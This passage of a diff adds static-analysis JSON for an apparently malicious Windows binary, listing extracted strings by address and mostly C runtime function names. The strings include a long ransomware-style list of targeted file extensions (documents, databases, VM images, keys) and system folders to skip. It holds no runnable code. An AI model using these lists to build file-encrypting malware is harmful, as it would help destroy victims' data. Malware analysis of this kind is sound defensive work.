+          "ea": 72276,
+          "summary": "`vector deleting destructor'"
+        },
+        {
+          "ea": 79680,
+          "summary": ".011"
+        },
+        {
+          "ea": 79692,
+          "summary": ".010"
+        },
+        {
+          "ea": 80644,
+          "summary": ".PPT"
+        },
+        {
+          "ea": 80008,
+          "summary": ".mml"
+        },
+        {
+          "ea": 79788,
+          "summary": ".002"
+        },
+        {
+          "ea": 79776,
+          "summary": ".003"
+        },
+        {
+          "ea": 79764,
+          "summary": ".004"
+        },
+        {
+          "ea": 79752,
+          "summary": ".005"
+        },
+        {
+          "ea": 78940,
+          "summary": ".gpg"
+        },
+        {
+          "ea": 79740,
+          "summary": ".006"
+        },
+        {
+          "ea": 79728,
+          "summary": ".007"
+        },
+        {
+          "ea": 79716,
+          "summary": ".008"
+        },
+        {
+          "ea": 79704,
+          "summary": ".009"
+        },
+        {
+          "ea": 80152,
+          "summary": ".pps"
+        },
+        {
+          "ea": 79500,
+          "summary": ".php"
+        },
+        {
+          "ea": 80680,
+          "summary": ".ott"
+        },
+        {
+          "ea": 78620,
+          "summary": "Boot"
+        },
+        {
+          "ea": 79480,
+          "summary": ".cpp"
+        },
+        {
+          "ea": 80572,
+          "summary": ".txt"
+        },
+        {
+          "ea": 79984,
+          "summary": ".ppam"
+        },
+        {
+          "ea": 71772,
+          "summary": "`placement delete[] closure'"
+        },
+        {
+          "ea": 79960,
+          "summary": ".ppsm"
+        },
+        {
+          "ea": 71392,
+          "summary": "`local static thread guard'"
+        },
+        {
+          "ea": 71292,
+          "summary": " Class Hierarchy Descriptor'"
+        },
+        {
+          "ea": 79972,
+          "summary": ".ppsx"
+        },
+        {
+          "ea": 79228,
+          "summary": ".tiff"
+        },
+        {
+          "ea": 78376,
+          "summary": "winnt"
+        },
+        {
+          "ea": 80260,
+          "summary": ".xltx"
+        },
+        {
+          "ea": 80104,
+          "summary": ".pptm"
+        },
+        {
+          "ea": 79324,
+          "summary": ".java"
+        },
+        {
+          "ea": 79924,
+          "summary": ".ms11"
+        },
+        {
+          "ea": 71804,
+          "summary": "`placement delete closure'"
+        },
+        {
+          "ea": 71344,
+          "summary": " Base Class Descriptor at ("
+        },
+        {
+          "ea": 79296,
+          "summary": ".class"
+        },
+        {
+          "ea": 72084,
+          "summary": "`virtual displacement map'"
+        },
+        {
+          "ea": 79824,
+          "summary": ".onetoc2"
+        },
+        {
+          "ea": 72596,
+          "summary": "__restrict"
+        },
+        {
+          "ea": 78480,
+          "summary": "Program Files"
+        },
+        {
+          "ea": 78440,
+          "summary": "Program Files (x86)"
+        },
+        {
+          "ea": 72636,
+          "summary": "__fastcall"
+        },
+        {
+          "ea": 71264,
+          "summary": " Complete Object Locator'"
+        },
+        {
+          "ea": 71580,
+          "summary": "`dynamic initializer for '"
+        },
+        {
+          "ea": 79640,
+          "summary": ".SQLITEDB"
+        },
+        {
+          "ea": 72684,
+          "summary": "__cdecl"
+        },
+        {
+          "ea": 71324,
+          "summary": " Base Class Array'"
+        },
+        {
+          "ea": 72672,
+          "summary": "__pascal"
+        },
+        {
+          "ea": 78632,
+          "summary": "Windows"
+        },
+        {
+          "ea": 79660,
+          "summary": ".SQLITE3"
+        },
+        {
+          "ea": 72532,
+          "summary": "operator"
+        },
+        {
+          "ea": 72340,
+          "summary": "`local static guard'"
+        },
+        {
+          "ea": 72584,
+          "summary": "__unaligned"
+        },
+        {
+          "ea": 80476,
+          "summary": ".dotx"
+        },
+        {
+          "ea": 80308,
+          "summary": ".xlsb"
+        },
+        {
+          "ea": 79856,
+          "summary": ".lay6"
+        },
+        {
+          "ea": 79996,
+          "summary": ".docb"
+        },
+        {
+          "ea": 78888,
+          "summary": ".qcow2"
+        },
+        {
+          "ea": 72660,
+          "summary": "__stdcall"
+        },
+        {
+          "ea": 80272,
+          "summary": ".xltm"
+        },
+        {
+          "ea": 72648,
+          "summary": "__thiscall"
+        },
+        {
+          "ea": 80464,
+          "summary": ".dotm"
+        },
+        {
+          "ea": 79108,
+          "summary": ".djvu"
+        },
+        {
+          "ea": 79936,
+          "summary": ".sldm"
+        },
+        {
+          "ea": 79948,
+          "summary": ".sldx"
+        },
+        {
+          "ea": 80080,
+          "summary": ".potm"
+        },
+        {
+          "ea": 80068,
+          "summary": ".potx"
+        },
+        {
+          "ea": 78792,
+          "summary": ".mpeg"
+        },
+        {
+          "ea": 79400,
+          "summary": ".dip"
+        },
+        {
+          "ea": 79420,
+          "summary": ".vbs"
+        },
+        {
+          "ea": 79456,
+          "summary": ".asm"
+        },
+        {
+          "ea": 79468,
+          "summary": ".pas"
+        },
+        {
+          "ea": 79512,
+          "summary": ".ldf"
+        },
+        {
+          "ea": 80368,
+          "summary": ".xlc"
+        },
+        {
+          "ea": 80536,
+          "summary": ".max"
+        },
+        {
+          "ea": 79216,
+          "summary": ".tif"
+        },
+        {
+          "ea": 79240,
+          "summary": ".NEF"
+        },
+        {
+          "ea": 80524,
+          "summary": ".3dm"
+        },
+        {
+          "ea": 79252,
+          "summary": ".psd"
+        },
+        {
+          "ea": 79264,
+          "summary": ".cmd"
+        },
+        {
+          "ea": 79276,
+          "summary": ".bat"
+        },
+        {
+          "ea": 80512,
+          "summary": ".DOT"
+        },
+        {
+          "ea": 79312,
+          "summary": ".jar"
+        },
+        {
+          "ea": 80560,
+          "summary": ".xml"
+        },
+        {
+          "ea": 79344,
+          "summary": ".asp"
+        },
+        {
+          "ea": 79364,
+          "summary": ".brd"
+        },
+        {
+          "ea": 79388,
+          "summary": ".dch"
+        },
+        {
+          "ea": 79376,
+          "summary": ".sch"
+        },
+        {
+          "ea": 80224,
+          "summary": ".123"
+        },
+        {
+          "ea": 80404,
+          "summary": ".sxc"
+        },
+        {
+          "ea": 80116,
+          "summary": ".std"
+        },
+        {
+          "ea": 80128,
+          "summary": ".sxd"
+        },
+        {
+          "ea": 80140,
+          "summary": ".pot"
+        },
+        {
+          "ea": 80164,
+          "summary": ".sti"
+        },
+        {
+          "ea": 80176,
+          "summary": ".sxi"
+        },
+        {
+          "ea": 80188,
+          "summary": ".otp"
+        },
+        {
+          "ea": 80212,
+          "summary": ".wb2"
+        },
+        {
+          "ea": 80056,
+          "summary": ".uop"
+        },
+        {
+          "ea": 80236,
+          "summary": ".wks"
+        },
+        {
+          "ea": 80248,
+          "summary": ".wk1"
+        },
+        {
+          "ea": 80392,
+          "summary": ".stc"
+        },
+        {
+          "ea": 80380,
+          "summary": ".dif"
+        },
+        {
+          "ea": 80320,
+          "summary": ".slk"
+        },
+        {
+          "ea": 80332,
+          "summary": ".xlw"
+        },
+        {
+          "ea": 80344,
+          "summary": ".xlt"
+        },
+        {
+          "ea": 80356,
+          "summary": ".xlm"
+        },
+        {
+          "ea": 79616,
+          "summary": ".mdb"
+        },
+        {
+          "ea": 80440,
+          "summary": ".hwp"
+        },
+        {
+          "ea": 79524,
+          "summary": ".mdf"
+        },
+        {
+          "ea": 79536,
+          "summary": ".ibd"
+        },
+        {
+          "ea": 79548,
+          "summary": ".MYI"
+        },
+        {
+          "ea": 79560,
+          "summary": ".MYD"
+        },
+        {
+          "ea": 79572,
+          "summary": ".frm"
+        },
+        {
+          "ea": 79584,
+          "summary": ".odb"
+        },
+        {
+          "ea": 79596,
+          "summary": ".dbf"
+        },
+        {
+          "ea": 80452,
+          "summary": ".602"
+        },
+        {
+          "ea": 80416,
+          "summary": ".ots"
+        },
+        {
+          "ea": 79812,
+          "summary": ".pst"
+        },
+        {
+          "ea": 79844,
+          "summary": ".asc"
+        },
+        {
+          "ea": 79868,
+          "summary": ".lay"
+        },
+        {
+          "ea": 80020,
+          "summary": ".sxm"
+        },
+        {
+          "ea": 80032,
+          "summary": ".otg"
+        },
+        {
+          "ea": 80044,
+          "summary": ".odg"
+        },
+        {
+          "ea": 80596,
+          "summary": ".uot"
+        },
+        {
+          "ea": 78708,
+          "summary": ".3g2"
+        },
+        {
+          "ea": 78696,
+          "summary": ".flv"
+        },
+        {
+          "ea": 78684,
+          "summary": ".wma"
+        },
+        {
+          "ea": 78672,
+          "summary": ".mid"
+        },
+        {
+          "ea": 78660,
+          "summary": ".m3u"
+        },
+        {
+          "ea": 78648,
+          "summary": ".m4u"
+        },
+        {
+          "ea": 78508,
+          "summary": "temp"
+        },
+        {
+          "ea": 72308,
+          "summary": "`vbase destructor'"
+        },
+        {
+          "ea": 71932,
+          "summary": "`udt returning'"
+        },
+        {
+          "ea": 80584,
+          "summary": ".CSV"
+        },
+        {
+          "ea": 79168,
+          "summary": ".raw"
+        },
+        {
+          "ea": 80608,
+          "summary": ".RTF"
+        },
+        {
+          "ea": 80632,
+          "summary": ".XLS"
+        },
+        {
+          "ea": 80656,
+          "summary": ".stw"
+        },
+        {
+          "ea": 80668,
+          "summary": ".sxw"
+        },
+        {
+          "ea": 80692,
+          "summary": ".odt"
+        },
+        {
+          "ea": 80704,
+          "summary": ".DOC"
+        },
+        {
+          "ea": 80728,
+          "summary": ".p12"
+        },
+        {
+          "ea": 80740,
+          "summary": ".csr"
+        },
+        {
+          "ea": 80764,
+          "summary": ".key"
+        },
+        {
+          "ea": 78732,
+          "summary": ".3gp"
+        },
+        {
+          "ea": 79180,
+          "summary": ".cgm"
+        },
+        {
+          "ea": 79156,
+          "summary": ".gif"
+        },
+        {
+          "ea": 79132,
+          "summary": ".bmp"
+        },
+        {
+          "ea": 79120,
+          "summary": ".svg"
+        },
+        {
+          "ea": 79096,
+          "summary": ".djv"
+        },
+        {
+          "ea": 79020,
+          "summary": ".bak"
+        },
+        {
+          "ea": 79008,
+          "summary": ".tbk"
+        },
+        {
+          "ea": 78976,
+          "summary": ".PAQ"
+        },
+        {
+          "ea": 78964,
+          "summary": ".ARC"
+        },
+        {
+          "ea": 78952,
+          "summary": ".aes"
+        },
+        {
+          "ea": 78928,
+          "summary": ".vmx"
+        }
+      ],
+      "imports": [
+        {
+          "ea": 1031,
+          "name": "fmiussy.#0",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 1128,
+          "name": "wesioyitxu.#0",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 1232,
+          "name": "wesioyitxu.#2",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 1410,
+          "name": "wesioyitxu.#1",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 1479,
+          "name": "wesioyitxu.#3",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 1774,
+          "name": "wesioyitxu.#4",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 1833,
+          "name": "cuovxnupr.#0",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 2125,
+          "name": "ssphl.#0",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 2735,
+          "name": "ssphl.#1",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 2807,
+          "name": "ssphl.#2",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 2873,
+          "name": "ssphl.#3",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 3506,
+          "name": "ssphl.#4",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 3602,
+          "name": "pylqeirxupohx.#0",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 36707,
+          "name": "rebixaldhajxr.#0",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 36767,
+          "name": "ylkuqdbg.#0",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 36800,
+          "name": "type_info.operator==",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 36832,
+          "name": "fmiussy.#4",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 36832,
+          "name": "__purecall",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 36874,
+          "name": "__aligned_offset_malloc",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 37052,
+          "name": "__aligned_malloc",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 37075,
+          "name": "std.exception.exception",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 37104,
+          "name": "bcwq.#1",
+          "type": "DEBUG",
+          "num_refs": 6
+        },
+        {
+          "ea": 37117,
+          "name": "std.exception._Copy_str",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 37181,
+          "name": "std.exception._Tidy",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 37211,
+          "name": "std.exception.exception",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 37250,
+          "name": "std.exception.operator=",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 37314,
+          "name": "uhqirfiliupnl.#0",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 37353,
+          "name": "std.exception.exception",
+          "type": "DEBUG",
+          "num_refs": 7
+        },
+        {
+          "ea": 37390,
+          "name": "operator new",
+          "type": "DEBUG",
+          "num_refs": 9
+        },
+        {
+          "ea": 38385,
+          "name": "__onexit_nolock",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 38567,
+          "name": "___onexitinit",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 38616,
+          "name": "__onexit",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 38676,
+          "name": "_atexit",
+          "type": "DEBUG",
+          "num_refs": 11
+        },
+        {
+          "ea": 38699,
+          "name": "_LocaleUpdate._LocaleUpdate",
+          "type": "DEBUG",
+          "num_refs": 7
+        },
+        {
+          "ea": 38834,
+          "name": "__wcsnicmp_l",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 39063,
+          "name": "__wcsnicmp",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 39221,
+          "name": "_xtoa@16",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 39288,
+          "name": "__ultoa",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 39314,
+          "name": "@x64toa@20",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 39425,
+          "name": "__ui64toa",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 39454,
+          "name": "_malloc",
+          "type": "DEBUG",
+          "num_refs": 9
+        },
+        {
+          "ea": 39664,
+          "name": "_memchr",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 39837,
+          "name": "__wcsicmp_l",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 40096,
+          "name": "__wcsicmp",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 40235,
+          "name": "__towlower_l",
+          "type": "DEBUG",
+          "num_refs": 5
+        },
+        {
+          "ea": 40395,
+          "name": "_towlower",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 40414,
+          "name": "_fast_error_exit",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 40455,
+          "name": "___tmainCRTStartup",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 40820,
+          "name": "_mainCRTStartup",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 40830,
+          "name": "__CxxThrowException@8",
+          "type": "DEBUG",
+          "num_refs": 64
+        },
+        {
+          "ea": 41024,
+          "name": "_strcmp",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 41160,
+          "name": "_abort",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 41211,
+          "name": "__set_abort_behavior",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 41244,
+          "name": "__GET_RTERRMSG",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 41282,
+          "name": "__NMSG_WRITE",
+          "type": "DEBUG",
+          "num_refs": 7
+        },
+        {
+          "ea": 41713,
+          "name": "__FF_MSGBANNER",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 41800,
+          "name": "__call_reportfault",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 42097,
+          "name": "__invoke_watson",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 42134,
+          "name": "__invalid_parameter",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 42179,
+          "name": "__invalid_parameter_noinfo",
+          "type": "DEBUG",
+          "num_refs": 14
+        },
+        {
+          "ea": 42195,
+          "name": "__get_errno_from_oserr",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 42261,
+          "name": "__errno",
+          "type": "DEBUG",
+          "num_refs": 30
+        },
+        {
+          "ea": 42336,
+          "name": "_memset",
+          "type": "DEBUG",
+          "num_refs": 10
+        },
+        {
+          "ea": 42458,
+          "name": "_strcpy_s",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 42560,
+          "name": "_strlen",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 42714,
+          "name": "__callnewh",
+          "type": "DEBUG",
+          "num_refs": 6
+        },
+        {
+          "ea": 42754,
+          "name": "__VEC_memcpy",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 43252,
+          "name": "___crtCorExitProcess",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 43319,
+          "name": "__lockexit",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 43328,
+          "name": "__unlockexit",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 43337,
+          "name": "__init_pointers",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 43388,
+          "name": "__initterm_e",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 43424,
+          "name": "__cinit",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 43575,
+          "name": "_doexit",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 43917,
+          "name": "__exit",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 43939,
+          "name": "__cexit",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 43954,
+          "name": "__c_exit",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 44000,
+          "name": "__SEH_prolog4",
+          "type": "DEBUG",
+          "num_refs": 18
+        },
+        {
+          "ea": 44096,
+          "name": "__except_handler4",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 44495,
+          "name": "CPtoLCID",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 44542,
+          "name": "setSBCS",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 44642,
+          "name": "setSBUpLow",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 45042,
+          "name": "___updatetmbcinfo",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 45206,
+          "name": "getSystemCP",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 45330,
+          "name": "__setmbcp_nolock",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 45820,
+          "name": "__setmbcp",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 46230,
+          "name": "___initmbctable",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 46260,
+          "name": "___addlocaleref",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 46403,
+          "name": "___removelocaleref",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 46556,
+          "name": "___freetlocinfo",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 46887,
+          "name": "__updatetlocinfoEx_nolock",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 46964,
+          "name": "___updatetlocinfo",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 47103,
+          "name": "___set_flsgetvalue",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 47155,
+          "name": "__mtterm",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 47216,
+          "name": "__initptd",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 47396,
+          "name": "__getptd_noexit",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 47517,
+          "name": "__getptd",
+          "type": "DEBUG",
+          "num_refs": 44
+        },
+        {
+          "ea": 47543,
+          "name": "__freefls@4",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 47846,
+          "name": "__mtinit",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 48240,
+          "name": "__aulldvrm",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 48389,
+          "name": "__heap_init",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 48419,
+          "name": "___crtLCMapStringW",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 48466,
+          "name": "_iswctype",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 48551,
+          "name": "__CxxUnhandledExceptionFilter",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 48631,
+          "name": "__XcptFilter",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 48961,
+          "name": "__wincmdln",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 49056,
+          "name": "__setenvp",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 49276,
+          "name": "_parse_cmdline",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 49686,
+          "name": "__setargv",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 49873,
+          "name": "___crtGetEnvironmentStringsA",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 50024,
+          "name": "__ioinit",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 50681,
+          "name": "___security_init_cookie",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 50836,
+          "name": "__mtinitlocks",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 50910,
+          "name": "__mtdeletelocks",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 50997,
+          "name": "__unlock",
+          "type": "DEBUG",
+          "num_refs": 13
+        },
+        {
+          "ea": 51020,
+          "name": "__mtinitlocknum",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 51214,
+          "name": "__lock",
+          "type": "DEBUG",
+          "num_refs": 12
+        },
+        {
+          "ea": 51522,
+          "name": "@_EH4_CallFilterFunc@8",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 51545,
+          "name": "@_EH4_TransferToHandler@8",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 51595,
+          "name": "@_EH4_LocalUnwind@16",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 51648,
+          "name": "_siglookup",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 51716,
+          "name": "_raise",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 52499,
+          "name": "_wcscat_s",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 52616,
+          "name": "_wcsncpy_s",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 52821,
+          "name": "_wcslen",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 52848,
+          "name": "_wcscpy_s",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 52947,
+          "name": "__set_error_mode",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 53065,
+          "name": "__VEC_memzero",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 53251,
+          "name": "__calloc_impl",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 53381,
+          "name": "_realloc",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 53554,
+          "name": "terminate",
+          "type": "DEBUG",
+          "num_refs": 11
+        },
+        {
+          "ea": 53611,
+          "name": "unexpected",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 53630,
+          "name": "_inconsistency",
+          "type": "DEBUG",
+          "num_refs": 13
+        },
+        {
+          "ea": 53718,
+          "name": "__initp_misc_cfltcvt_tab",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 53760,
+          "name": "__ValidateImageBase",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 53824,
+          "name": "__FindPESection",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 53904,
+          "name": "__IsNonwritableInCurrentImage",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 54092,
+          "name": "__crtLCMapStringA_stat",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 54579,
+          "name": "___crtLCMapStringA",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 54649,
+          "name": "__crtGetStringTypeA_stat",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 54880,
+          "name": "___crtGetStringTypeA",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 54944,
+          "name": "___free_lc_time",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 55831,
+          "name": "___free_lconv_num",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 55936,
+          "name": "___free_lconv_mon",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 56192,
+          "name": "_strcspn",
+          "type": "DEBUG",
+          "num_refs": 0
+        },
+        {
+          "ea": 57152,
+          "name": "_strpbrk",
+          "type": "DEBUG",
+          "num_refs": 0
+        },
+        {
+          "ea": 57216,
+          "name": "_wcsnlen",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 57248,
+          "name": "x_ismbbtype_l",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 57331,
+          "name": "__ismbblead",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 57671,
+          "name": "___report_gsfailure",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 57936,
+          "name": "__alloca_probe_16",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 58048,
+          "name": "___ascii_strnicmp",
+          "type": "DEBUG",
+          "num_refs": 0
+        },
+        {
+          "ea": 58160,
+          "name": "__allmul",
+          "type": "DEBUG",
+          "num_refs": 0
+        },
+        {
+          "ea": 58413,
+          "name": "CatchGuardHandler",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 58679,
+          "name": "TranslatorGuardHandler",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 58838,
+          "name": "_GetRangeOfTrysToCheck",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 58953,
+          "name": "__CreateFrameInfo",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 58997,
+          "name": "__IsExceptionObjectToBeDestroyed",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 59036,
+          "name": "__FindAndUnlinkFrame",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 59118,
+          "name": "_CallCatchBlock2",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 59216,
+          "name": "__EH_prolog",
+          "type": "DEBUG",
+          "num_refs": 55
+        },
+        {
+          "ea": 59258,
+          "name": "bcwq.#0",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 59297,
+          "name": "___TypeMatch",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 59392,
+          "name": "___FrameUnwindFilter",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 59471,
+          "name": "___FrameUnwindToState",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 59691,
+          "name": "ExFilterRethrow",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 59845,
+          "name": "___AdjustPointer",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 60004,
+          "name": "CallUnexpected",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 60489,
+          "name": "___BuildCatchObjectHelper",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 61018,
+          "name": "CatchIt",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 61128,
